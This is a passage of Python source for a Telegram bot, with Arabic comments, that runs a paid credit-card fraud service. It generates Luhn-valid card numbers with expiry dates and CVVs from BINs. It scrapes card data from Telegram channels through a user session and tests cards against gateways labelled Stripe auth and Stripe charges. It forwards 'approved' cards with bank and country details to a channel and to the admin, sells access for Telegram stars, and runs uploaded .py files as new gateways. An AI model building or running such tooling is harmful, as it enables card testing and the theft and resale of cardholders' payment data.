                        year = year[2:]  # 2025 -> 25
                    cards.add(f"{number}|{month}|{year}|{cvv}")

        await client.disconnect()
        return list(cards)
    except Exception as e:
        try:
            await client.disconnect()
        except:
            pass
        raise e
for cmd in config.get('disabled_portals', []):
    if cmd in portal_modules:
        del portal_modules[cmd]
    if cmd in portal_commands:
        del portal_commands[cmd]
def get_bin_info(cc):
    try:
        resp = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'bank': data.get('bank', {}).get('name', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '?'),
                'brand': data.get('scheme', 'Unknown').upper(),
                'type': data.get('type', 'Unknown').upper(),
            }
    except:
        pass
    return {'bank': 'Unknown', 'country': 'Unknown', 'emoji': '?', 'brand': 'Unknown', 'type': 'Unknown'}
def luhn_check(card_num):
    """التحقق من صحة رقم البطاقة بخوارزمية Luhn"""
    digits = [int(d) for d in str(card_num)]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return sum(digits) % 10 == 0

def generate_cards(bin_input, count):
    """توليد بطاقات ذات تواريخ انتهاء حديثة (صلاحية تبدأ من سنة إلى 4 سنوات قادمة)"""
    bin_prefix = re.sub(r'\D', '', bin_input)[:6]
    if len(bin_prefix) < 6:
        raise ValueError("BIN يجب أن يكون 6 أرقام على الأقل")
    
    current_year = datetime.now().year % 100  # آخر رقمين من السنة الحالية
    cards = []
    for _ in range(count):
        # إنشاء 9 أرقام عشوائية بعد الـ 6
        partial = bin_prefix + ''.join(random.choices('0123456789', k=9))
        # إكمال الرقم الأخير باستخدام Luhn (نجرب تغيير آخر رقم)
        for last in range(10):
            candidate = partial[:-1] + str(last)
            if luhn_check(candidate):
                number = candidate
                break
        else:
            number = partial[:15] + str(random.randint(0,9))

        # تاريخ انتهاء حديث: السنة القادمة (على الأقل) وحتى 4 سنوات قادمة
        future_year = current_year + random.randint(1, 4)
        month = str(random.randint(1,12)).zfill(2)
        year = str(future_year).zfill(2)
        cvv = str(random.randint(100,999)).zfill(3)
        cards.append(f"{number}|{month}|{year}|{cvv}")
    return cards
def check_subscription(user_id):
    data = load_data()
    user_id = str(user_id)
    if user_id not in data:
        data[user_id] = {"plan": "FREE", "timer": "none"}
        save_data(data)
        return "FREE", None
    plan = data[user_id].get("plan", "FREE")
    timer_str = data[user_id].get("timer", "none")
    if timer_str == "none":
        return plan, None
    try:
        expiry = datetime.strptime(timer_str, "%Y-%m-%d %H:%M")
        if datetime.now() > expiry:
            data[user_id]["plan"] = "FREE"
            data[user_id]["timer"] = "none"
            save_data(data)
            return "FREE", None
        return plan, expiry
    except:
        return plan, None

def is_banned(user_id):
    return str(user_id) in banned_users

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_user_session(user_id):
    if user_id not in user_sessions:
        session_file = f'session_{user_id}.pkl'
        user_sessions[user_id] = defonali(session_file)
    return user_sessions[user_id]

def notify_admin_new_user(user_id, first_name, username):
    if user_id in notified_users:
        return
    notified_users.add(user_id)
    data = load_data()
    total = len(data)
    text = f"""<b>مستخدم جديد</b>
━━━━━━━━━━━━━━━━━━━━━━
{first_name} | @{username if username else 'بدون'}
ID: <code>{user_id}</code>
الاجمالي: {total}"""
    try:
        bot.send_message(ADMIN_ID, text)
    except:
        pass

def notify_approved(card, gateway, result, user_id, username):
    """إرسال البطاقة المقبولة إلى القناة (إن وُجدت) + المستخدم + الأدمن مع تفاصيل كاملة"""
    save_approved_card(card, gateway, result)
    binfo = get_bin_info(card)

    # 1) إرسال إلى القناة (إذا تم تعيينها)
    if CHANNEL_ID:
        try:
            channel_text = f"""<b>Approved ✅</b>
━━━━━━━━━━━━━━━━━━━━━━
card: <code>{card}</code>
geteway: {gateway}
response: {result}
bank: {binfo['bank']}
country: {binfo['country']} {binfo['emoji']}
type: {binfo['brand']} | {binfo['type']}
BIN: <code>{card[:6]}</code>
<a href="tg://user?id={user_id}">{username or 'بدون'}</a>
━━━━━━━━━━━━━━━━━━━━━━"""
            bot.send_message(CHANNEL_ID, channel_text)
        except:
            pass

    # 2) إرسال إلى المستخدم
    try:
        user_text = f"""<b>Approved ✅</b>
━━━━━━━━━━━━━━━━━━━━━━
<code>{card}</code>
{gateway}
{result}
━━━━━━━━━━━━━━━━━━━━━━"""
        bot.send_message(user_id, user_text)
    except:
        pass

    # 3) إرسال إلى الأدمن
    try:
        admin_text = f"""<b>شحنة جديدة</b>
━━━━━━━━━━━━━━━━━━━━━━
المستخدم: <a href="tg://user?id={user_id}">{username or 'بدون'}</a>
ID: <code>{user_id}</code>
<code>{card}</code>
{gateway}
{result}
━━━━━━━━━━━━━━━━━━━━━━"""
        bot.send_message(admin_text)
    except:
        pass

# ============================================================
# أوامر إدارة الكلمات المخصصة
# ============================================================
def run_file_check_async(call, gateway_func, gateway_name):
    """تشغيل run_file_check في خيط منفصل حتى لا يتوقف البوت"""
    thread = threading.Thread(target=run_file_check, args=(call, gateway_func, gateway_name))
    thread.daemon = True
    thread.start()
@bot.message_handler(commands=['addapproved'])
def add_approved_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    try:
        keyword = message.text.split(' ', 1)[1].strip()
    except:
        return bot.reply_to(message, "استخدم: /addapproved [الكلمة]")
    cfg = load_config()
    if keyword not in cfg['custom_approved_keywords']:
        cfg['custom_approved_keywords'].append(keyword)
        save_config(cfg)
        bot.reply_to(message, f"تم اضافة '{keyword}' الى Approved")
    else:
        bot.reply_to(message, "الكلمة موجودة بالفعل")

@bot.message_handler(commands=['adddeclined'])
def add_declined_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    try:
        keyword = message.text.split(' ', 1)[1].strip()
    except:
        return bot.reply_to(message, "استخدم: /adddeclined [الكلمة]")
    cfg = load_config()
    if keyword not in cfg['custom_declined_keywords']:
        cfg['custom_declined_keywords'].append(keyword)
        save_config(cfg)
        bot.reply_to(message, f"تم اضافة '{keyword}' الى Declined")
    else:
        bot.reply_to(message, "الكلمة موجودة بالفعل")

@bot.message_handler(commands=['listkeywords'])
def list_keywords_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    cfg = load_config()
    app = cfg.get('custom_approved_keywords', [])
    dec = cfg.get('custom_declined_keywords', [])
    text = f"<b>الكلمات المخصصة:</b>\nApproved: {', '.join(app) if app else 'لا يوجد'}\nDeclined: {', '.join(dec) if dec else 'لا يوجد'}"
    bot.reply_to(message, text)

# ============================================================
# أمر تعيين قناة الإشعارات
# ============================================================
@bot.message_handler(commands=['setchannel'])
def set_channel_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    try:
        new_id = message.text.split(' ')[1]
    except:
        return bot.reply_to(message, "استخدم: /setchannel [معرف القناة]\nمثال: /setchannel -1001234567890")
    global CHANNEL_ID
    CHANNEL_ID = new_id
    config['channel_id'] = new_id
    save_config(config)
    bot.reply_to(message, f"تم تعيين قناة Approved ✅: <code>{new_id}</code>")

# ============================================================
# لوحة التحكم
# ============================================================
def show_admin_panel(chat_id, message_id=None):
    cfg = load_config()
    force = "مفعل" if cfg['force_subscription'] else "معطل"
    maint = "مفعل" if cfg.get('maintenance_mode', False) else "معطل"
    p = cfg['prices']
    ha_status = "ديناميكي" if cfg['ha_credentials'].get('use_dynamic', True) else ("ثابت" if cfg['ha_credentials'].get('token') else "غير مضبوط")
    channel = f"<code>{CHANNEL_ID}</code>" if CHANNEL_ID else "غير محدد"
    portals = load_portals()
    portal_list = "\n".join([f"/{info['command']} - {name}" for name, info in portals.items()]) if portals else "لا توجد بوابات اضافية"
    text = f"""<b>لوحة التحكم</b>
━━━━━━━━━━━━━━━━━━━━━━
📌 الاشتراك الاجباري: {force}
🛠 وضع الصيانة: {maint}
💰 الأسعار: يوم {p['day']}، 3ايام {p['3days']}، اسبوع {p['week']}، شهر {p['month']}
🌐 stripe charge: {ha_status}
📢 قناة Approved: {channel}
📂 البوابات المخصصة:
{portal_list}
━━━━━━━━━━━━━━━━━━━━━━"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("تبديل الاشتراك الاجباري", callback_data="admin_toggle_force", style="primary"),
        types.InlineKeyboardButton("تبديل الصيانة", callback_data="admin_toggle_maintenance", style="primary")
    )
    markup.add(
        types.InlineKeyboardButton("تعديل الأسعار", callback_data="admin_edit_prices", style="primary"),
        types.InlineKeyboardButton("احصائيات", callback_data="admin_stats", style="primary")
    )
    markup.add(
        types.InlineKeyboardButton("انشاء كود", callback_data="admin_create_code", style="success"),
        types.InlineKeyboardButton("اذاعة", callback_data="admin_broadcast", style="primary")
    )
    markup.add(types.InlineKeyboardButton("stripe charge Token", callback_data="admin_set_ha", style="primary"))
    markup.add(types.InlineKeyboardButton("تعيين قناة Approved", callback_data="admin_set_channel", style="primary"))
    markup.add(types.InlineKeyboardButton("تحديث", callback_data="admin_refresh", style="primary"))
    markup.add(types.InlineKeyboardButton("اغلاق", callback_data="admin_close", style="danger"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        except:
            bot.send_message(chat_id, text, reply_markup=markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup)
# ============================================================
# أمر تعيين جلسة Telethon النصية
# ============================================================
@bot.message_handler(commands=['setsession'])
def set_session_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    try:
        session_str = message.text.split(' ', 1)[1].strip()
    except:
        return bot.reply_to(message, "استخدم: /setsession [جلسة Telethon النصية]")
    cfg = load_config()
    cfg['telethon_session'] = session_str
    save_config(cfg)
    bot.reply_to(message, "✅ تم حفظ الجلسة بنجاح")

# ============================================================
# أمر سكراب البطاقات
# ============================================================
@bot.message_handler(commands=['scr'])
def scr_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    try:
        parts = message.text.split(' ')
        if len(parts) < 3:
            return bot.reply_to(message, "استخدم: /scr [رابط/معرف القناة] [العدد]")

        chat = parts[1]
        limit = int(parts[2])
        if limit <= 0 or limit > 10000:
            return bot.reply_to(message, "العدد يجب بين 1 - 10000")

        msg = bot.reply_to(message, "جاري السحب...")

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            cards = loop.run_until_complete(scrape_cards_user(chat, limit))
        finally:
            loop.close()

        if not cards:
            return bot.edit_message_text("لم يتم العثور على بطاقات", msg.chat.id, msg.message_id)

        filename = f"cards_{message.from_user.id}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write('\n'.join(cards))

        with open(filename, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f" تم استخراج {len(cards)} بطاقة")

        os.remove(filename)
        bot.delete_message(msg.chat.id, msg.message_id)

    except Exception as e:
        bot.reply_to(message, f"خطأ: {e}")
@bot.message_handler(commands=['delport'])
def del_portal_cmd(message):
    builtin_commands = ['st', 'py', 'ha', 'br']
    builtin_portal_names = {
    "Stripe Auth": "st",
    "stripe charge 10$": "py",
    "stripe charge 5$": "ha",
    "Stripe charge 1$": "br"
}
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")

    parts = message.text.split(' ')
    if len(parts) < 2:
        return bot.reply_to(message, "استخدم: /delport [اسم البوابة أو الأمر]")

    target = parts[1]
    cmd = target.replace('/', '').lower()  # إزالة '/' وجعلها صغيرة

    # 1) التحقق مما إذا كان اسم بوابة مدمجة معروف
    if target in builtin_portal_names:
        cmd = builtin_portal_names[target]  # استخراج الأمر المختصر
    # وإلا إذا كان cmd ليس في builtin_commands نحاول إيجاده كاسم
    elif cmd not in builtin_commands:
        # ربما يكون اسم بوابة مخصصة
        pass

    # 2) محاولة حذف بوابة مخصصة
    portals = load_portals()
    for name, info in list(portals.items()):
        if name == target or info['command'] == cmd:
            info = portals.pop(name)
            save_portals(portals)

            if info['command'] in portal_modules:
                del portal_modules[info['command']]
            if info['command'] in portal_commands:
                del portal_commands[info['command']]

            filepath = info['file']
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'rb') as f:
                        bot.send_document(message.chat.id, f, caption=f"تم حذف البوابة: {name}")
                except:
                    bot.reply_to(message, f"تم حذف البوابة: {name} (فشل إرسال الملف)")
            else:
                bot.reply_to(message, f"تم حذف البوابة: {name} (الملف كان غير موجود)")
            return

    # 3) تعطيل بوابة مدمجة
    builtin_commands = ['st', 'py', 'ha', 'br']
    if cmd in builtin_commands:
        cfg = load_config()
        disabled = cfg.get('disabled_portals', [])
        if cmd not in disabled:
            disabled.append(cmd)
            cfg['disabled_portals'] = disabled
            save_config(cfg)

            bot.reply_to(message, f"تم تعطيل البوابة المدمجة: /{cmd}\nستعود بعد حذفها من القائمة أو إعادة تشغيل البوت")
        else:
            bot.reply_to(message, "البوابة معطّلة بالفعل")
        return

    bot.reply_to(message, "لم يتم العثور على البوابة")
@bot.message_handler(commands=['admin', 'panel'])
def admin_cmd(message):
    if is_admin(message.from_user.id):
        show_admin_panel(message.chat.id)
    else:
        bot.reply_to(message, "غير مصرح")

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback_handler(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "غير مصرح", show_alert=True)
        return
    if call.data == 'admin_close':
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "تم الاغلاق")
        return
    elif call.data == 'admin_refresh':
        show_admin_panel(call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "تم التحديث")
        return
    elif call.data == 'admin_toggle_force':
        cfg = load_config()
        cfg['force_subscription'] = not cfg['force_subscription']
        save_config(cfg)
        show_admin_panel(call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, f"اصبح: {cfg['force_subscription']}")
        return
    elif call.data == 'admin_toggle_maintenance':
        cfg = load_config()
        cfg['maintenance_mode'] = not cfg.get('maintenance_mode', False)
        save_config(cfg)
        show_admin_panel(call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, f"وضع الصيانة: {cfg['maintenance_mode']}")
        return
    elif call.data == 'admin_stats':
        data = load_data()
        total = len(data)
        vip_count = sum(1 for u in data.values() if u.get('plan') == 'VIP')
        free_count = total - vip_count
        text = f"الاجمالي: {total}\nVIP: {vip_count}\nمجاني: {free_count}"
        bot.answer_callback_query(call.id, text, show_alert=True)
        return
    elif call.data == 'admin_create_code':
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("يوم", callback_data="gencode_day", style="primary"),
            types.InlineKeyboardButton("3 ايام", callback_data="gencode_3days", style="primary"),
            types.InlineKeyboardButton("اسبوع", callback_data="gencode_week", style="primary"),
            types.InlineKeyboardButton("شهر", callback_data="gencode_month", style="primary")
        )
        bot.edit_message_text("اختر مدة الكود:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        return
    elif call.data == 'admin_broadcast':
        msg = bot.send_message(call.message.chat.id, "ارسل الرسالة للاذاعة:")
        bot.register_next_step_handler(msg, process_broadcast)
        bot.answer_callback_query(call.id)
        return
    elif call.data == 'admin_edit_prices':
        msg = bot.send_message(call.message.chat.id, "ارسل الاسعار بالصيغة:\n<code>يوم,3ايام,اسبوع,شهر</code>\nمثال: 15,25,50,120")
        bot.register_next_step_handler(msg, process_setprice)
        bot.answer_callback_query(call.id)
        return
    elif call.data == 'admin_set_ha':
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("ديناميكي", callback_data="ha_dynamic", style="success"),
            types.InlineKeyboardButton("تعيين ثابت", callback_data="ha_set_static", style="primary")
        )
        bot.edit_message_text("اختر وضع stripe charge Token:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    elif call.data == 'admin_set_channel':
        msg = bot.send_message(call.message.chat.id, "أرسل معرف القناة (مثال: <code>-1001234567890</code>)")
        bot.register_next_step_handler(msg, process_set_channel_from_panel)
        bot.answer_callback_query(call.id, "ارسل معرف القناة الان")
        return

def process_set_channel_from_panel(message):
    if not is_admin(message.from_user.id):
        return
    new_id = message.text.strip()
    global CHANNEL_ID
    CHANNEL_ID = new_id
    config['channel_id'] = new_id
    save_config(config)
    bot.reply_to(message, f"تم تعيين قناة Approved ✅: <code>{new_id}</code>")
    show_admin_panel(message.chat.id)

def process_broadcast(message):
    if not is_admin(message.from_user.id):
        return
    data = load_data()
    success = 0
    for user_id in data:
        try:
            bot.send_message(user_id, message.text)
            success += 1
        except:
            pass
    bot.reply_to(message, f"تم الاذاعة الى {success} مستخدم")

def process_setprice(message):
    if not is_admin(message.from_user.id):
        return
    try:
        parts = message.text.strip().split(',')
        if len(parts) != 4:
            raise ValueError
        cfg = load_config()
        cfg['prices'] = {
            "day": int(parts[0]),
            "3days": int(parts[1]),
            "week": int(parts[2]),
            "month": int(parts[3])
        }
        save_config(cfg)
        bot.reply_to(message, "تم تحديث الأسعار")
    except:
        bot.reply_to(message, "صيغة خاطئة")

@bot.callback_query_handler(func=lambda call: call.data.startswith('ha_'))
def ha_config_cb(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "غير مصرح", show_alert=True)
        return
    cfg = load_config()
    if call.data == 'ha_dynamic':
        cfg['ha_credentials']['use_dynamic'] = True
        save_config(cfg)
        show_admin_panel(call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "تم تفعيل الديناميكي")
    elif call.data == 'ha_set_static':
        msg = bot.send_message(call.message.chat.id, "ارسل Token الثابت:")
        bot.register_next_step_handler(msg, process_ha_token)
        bot.answer_callback_query(call.id)

def process_ha_token(message):
    if not is_admin(message.from_user.id):
        return
    token = message.text.strip()
    cfg = load_config()
    cfg['ha_credentials']['token'] = token
    cfg['ha_credentials']['use_dynamic'] = False
    save_config(cfg)
    bot.reply_to(message, "تم تعيين stripe charge Token الثابت")
    show_admin_panel(message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('gencode_'))
def generate_code(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "غير مصرح", show_alert=True)
        return
    days = {'gencode_day': 1, 'gencode_3days': 3, 'gencode_week': 7, 'gencode_month': 30}[call.data]
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M")
    data = load_data()
    data[code] = {"plan": "VIP", "timer": expiry, "used": False}
    save_data(data)
    bot.send_message(call.message.chat.id, f"كود VIP ({days} يوم):\n<code>{code}</code>\nصالح حتى: {expiry}")
    bot.answer_callback_query(call.id)
    show_admin_panel(call.message.chat.id, call.message.message_id)

# ============================================================
# أوامر الأدمن الإضافية
# ============================================================
@bot.message_handler(commands=['ban'])
def ban_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    try:
        target = int(message.text.split(' ')[1])
    except:
        return bot.reply_to(message, "استخدم: /ban [الايدي]")
    if target == ADMIN_ID:
        return bot.reply_to(message, "لا يمكن حظر المشرف")
    banned = load_banned()
    if str(target) not in banned:
        banned.append(str(target))
        save_banned(banned)
        bot.reply_to(message, f"تم حظر {target}")
    else:
        bot.reply_to(message, "مستخدم محظور بالفعل")

@bot.message_handler(commands=['unban'])
def unban_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    try:
        target = int(message.text.split(' ')[1])
    except:
        return bot.reply_to(message, "استخدم: /unban [الايدي]")
    banned = load_banned()
    if str(target) in banned:
        banned.remove(str(target))
        save_banned(banned)
        bot.reply_to(message, f"تم فك حظر {target}")
    else:
        bot.reply_to(message, "المستخدم غير محظور")

@bot.message_handler(commands=['users'])
def users_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    data = load_data()
    total = len(data)
    vip = sum(1 for u in data.values() if u.get('plan') == 'VIP')
    free = total - vip
    bot.reply_to(message, f"الاجمالي: {total}\nVIP: {vip}\nمجاني: {free}")

# ============================================================
# نظام الأكواد (تم إصلاحه - يوضع قبل المعالج العام ليعمل)
# ============================================================
@bot.message_handler(commands=['addport'])
def add_portal_cmd(message):
    if not is_admin(message.from_user.id):
        return bot.reply_to(message, "غير مصرح")
    args = message.text.split(' ')
    if len(args) < 3:
        return bot.reply_to(message, "استخدم: /addport [اسم البوابة] [اختصار الامر]")
    name = args[1]
    cmd = args[2].replace('/', '')
    reserved = ['start','cmds','buy','status','redeem','admin','panel','addport','delport','broadcast','setprice','ban','unban','users','setsession','scr','setchannel'] + list(portal_commands.keys()) + ['st','py','ha','br']
    if cmd in reserved:
        return bot.reply_to(message, "الامر محجوز")
    msg = bot.reply_to(message, f"ارسل ملف البوابة (.py) يحتوي على دالة check(card)")
    bot.register_next_step_handler(msg, process_portal_file, name, cmd)

def process_portal_file(message, name, command):
    if not is_admin(message.from_user.id):
        return
    if not message.document:
        return bot.reply_to(message, "يجب ارسال ملف")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        if not os.path.exists(PORTALS_DIR):
            os.makedirs(PORTALS_DIR)
        filepath = os.path.join(PORTALS_DIR, f"{name}.py")
        with open(filepath, 'wb') as f:
            f.write(downloaded)
        spec = importlib.util.spec_from_file_location(f"portal_{name}", filepath)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        if not hasattr(mod, 'check'):
            os.remove(filepath)
            return bot.reply_to(message, "الملف لا يحتوي على دالة check")
        portals = load_portals()
        portals[name] = {
            "command": command,
            "file": filepath,
            "active": True
        }
        save_portals(portals)
        portal_modules[command] = mod
        portal_commands[command] = name
        bot.reply_to(message, f"تم اضافة البوابة: {name} | الامر: /{command}")
    except Exception as e:
        bot.reply_to(message, f"خطأ: {e}")
@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    try:
        code = message.text.split(' ')[1].strip()
    except:
        return bot.reply_to(message, "/redeem [الكود]")
    data = load_data()
    if code not in data or 'plan' not in data[code]:
        return bot.reply_to(message, "كود غير صالح")
    info = data[code]
    if info.get('used'):
        return bot.reply_to(message, "مستخدم مسبقاً")
    try:
        expiry = datetime.strptime(info['timer'], "%Y-%m-%d %H:%M")
        if datetime.now() > expiry:
            return bot.reply_to(message, "منتهي الصلاحية")
    except:
        return bot.reply_to(message, "خطأ في البيانات")
    user_id = str(message.from_user.id)
    data[user_id] = {"plan": info['plan'], "timer": info['timer']}
    data[code]['used'] = True
    save_data(data)
    bot.reply_to(message, f"تم تفعيل {info['plan']} حتى {info['timer']}")

# ============================================================
# نظام الدفع بنجوم تيليجرام
# ============================================================
@bot.message_handler(commands=['subscribe', 'buy'])
def subscribe_command(message):
    if is_banned(message.from_user.id):
        bot.reply_to(message, "محظور.")
        return
    cfg = load_config()
    p = cfg['prices']
    text = f"""<b>اختر مدة الاشتراك</b>
━━━━━━━━━━━━━━━━━━━━━━
يوم: {p['day']} نجمه
3 ايام: {p['3days']} نجمه
اسبوع: {p['week']} نجمه
شهر: {p['month']} نجمه"""
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"يوم - {p['day']}", callback_data="sub_day", style="success"),
        types.InlineKeyboardButton(f"3 ايام - {p['3days']}", callback_data="sub_3days", style="success"),
        types.InlineKeyboardButton(f"اسبوع - {p['week']}", callback_data="sub_week", style="success"),
        types.InlineKeyboardButton(f"شهر - {p['month']}", callback_data="sub_month", style="success")
    )
    markup.add(types.InlineKeyboardButton("الغاء", callback_data="sub_cancel", style="danger"))
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('sub_'))
def sub_callback(call):
    if is_banned(call.from_user.id):
        bot.answer_callback_query(call.id, "محظور", show_alert=True)
        return
    if call.data == "sub_cancel":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id, "تم الالغاء")
        return
    cfg = load_config()
    p = cfg['prices']
    duration_map = {
        "sub_day": ("day", "يوم واحد", p['day'], 1),
        "sub_3days": ("3days", "3 ايام", p['3days'], 3),
        "sub_week": ("week", "اسبوع", p['week'], 7),
        "sub_month": ("month", "شهر", p['month'], 30)
    }
    key, name, price, days = duration_map[call.data]
    try:
        bot.send_invoice(
            chat_id=call.message.chat.id,
            title=f"اشتراك VIP - {name}",
            description=f"اشتراك VIP لمدة {name}",
            invoice_payload=f"vip_{key}_{call.from_user.id}",
            provider_token=PROVIDER_TOKEN,
            currency="XTR",
            prices=[types.LabeledPrice(label=f"VIP {name}", amount=price)],
            start_parameter=f"vip_{key}"
        )
    except Exception as e:
        bot.answer_callback_query(call.id, f"خطا: {e}", show_alert=True)
    else:
        bot.answer_callback_query(call.id)

@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def got_payment(message):
    payment = message.successful_payment
    payload = payment.invoice_payload
    parts = payload.split('_')
    if len(parts) >= 3 and parts[0] == 'vip':
        duration_key = parts[1]
        user_id = parts[2]
        days_map = {"day": 1, "3days": 3, "week": 7, "month": 30}
        days = days_map.get(duration_key, 1)
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M")
        data = load_data()
        data[user_id] = {"plan": "VIP", "timer": expiry}
        save_data(data)
        bot.send_message(message.chat.id, f"""<b>تم تفعيل VIP</b>
━━━━━━━━━━━━━━━━━━━━━━
ينتهي: {expiry}""")

# ============================================================
# أوامر المستخدم الأساسية
# ============================================================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "محظور.")
        return
    notify_admin_new_user(user_id, message.from_user.first_name, message.from_user.username)
    cfg = load_config()
    if cfg.get('maintenance_mode') and not is_admin(user_id):
        bot.send_message(message.chat.id, "في صيانة.")
        return
    plan, exp = check_subscription(user_id)
    name = message.from_user.first_name
    if cfg['force_subscription'] and plan == "FREE" and not is_admin(user_id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("اشتراك VIP", callback_data="subscribe_menu", style="success"))
        bot.send_photo(message.chat.id, cfg['welcome_image'],
                       caption=f"""<b>HELLO {name}

/cmds   لعرض الاوامر

VIP مطلوب.</b>""", reply_markup=markup)
        return
    if plan == "FREE":
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("اشتراك VIP", callback_data="subscribe_menu", style="success"))
        bot.send_photo(message.chat.id, cfg['welcome_image'],
                       caption=f"""<b>HELLO {name}
/cmds   لعرض الاوامر
محدود.</b>""", reply_markup=markup)
    else:
        remaining = ""
        if exp:
            delta = exp - datetime.now()
            remaining = f"\nمتبقي: {delta.days} يوم" if delta.days > 0 else "\nاقل من يوم"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("JOIN", url=cfg['support_link'], style="primary"))
        bot.send_photo(message.chat.id, cfg['welcome_image'],
                       caption=f"اضغط /cmds{remaining}\n{BOT_CREATOR} ({BOT_USERNAME})", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'subscribe_menu')
def subscribe_menu_cb(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    subscribe_command(call.message)

@bot.message_handler(commands=['cmds'])
def cmds_cmd(message):
    if is_banned(message.from_user.id):
        bot.reply_to(message, "محظور.")
        return
    cmds = f"""/st stripe auth
/py stripe charge 10$
/ha stripe charge 5$
/br stripe charge 1$"""
    portals = load_portals()
    for name, info in portals.items():
        if info.get('active', True):
            cmds += f"\n/{info['command']} - {name}"
    text = f"""<b>الاوامر</b>
━━━━━━━━━━━━━━━━━━━━━━
{cmds}

ارسل ملف - اختر البوابه
/buy - اشتراك VIP
/status - حاله الاشتراك
/redeem [كود] - تفعيل كود
/scr الرابط العدد
/gen لتوليد 10 بطاقات من بين 
/genn لتوليد ملف نصي فيه بطاقات من بين او مجموعة بين
━━━━━━━━━━━━━━━━━━━━━━
{BOT_CREATOR} ({BOT_USERNAME})"""
    bot.send_message(message.chat.id, text)
@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    user_id = message.from_user.id
    if is_banned(user_id): return
    plan, _ = check_subscription(user_id)
    if config.get('force_subscription') and plan == "FREE" and not is_admin(user_id):
        return bot.reply_to(message, "VIP مطلوب.")
    try:
        bin_val = message.text.split(' ')[1]
    except:
        return bot.reply_to(message, "استخدم: /gen [BIN]\nمثال: /gen 552433")
    
    try:
        cards = generate_cards(bin_val, 10)
    except Exception as e:
        return bot.reply_to(message, f"خطأ: {e}")
    
    binfo = get_bin_info(bin_val[:6])
    msg_lines = [f"BIN: <code>{bin_val[:6]}</code> | {binfo['bank']} | {binfo['country']} {binfo['emoji']} | {binfo['brand']}"]
    for c in cards:
        msg_lines.append(f"<code>{c}</code>")
    output = "\n".join(msg_lines)
    bot.reply_to(message, output, parse_mode="HTML")
# ============================================================
# أمر /genn – توليد بطاقات من عدة BINs (ملف)
# ============================================================
@bot.message_handler(commands=['genn'])
def genn_cmd(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        return
    plan, _ = check_subscription(user_id)
    if config.get('force_subscription') and plan == "FREE" and not is_admin(user_id):
        return bot.reply_to(message, "VIP مطلوب.")

    msg = bot.reply_to(message, "أرسل الـ BIN أو BINs (كل واحد في سطر منفصل)\nمثال:\n552433\n400022")
    bot.register_next_step_handler(msg, process_genn_bins)


def process_genn_bins(message):
    # إذا أرسل المستخدم أمراً، ألغِ الجلسة
    if message.text.startswith('/'):
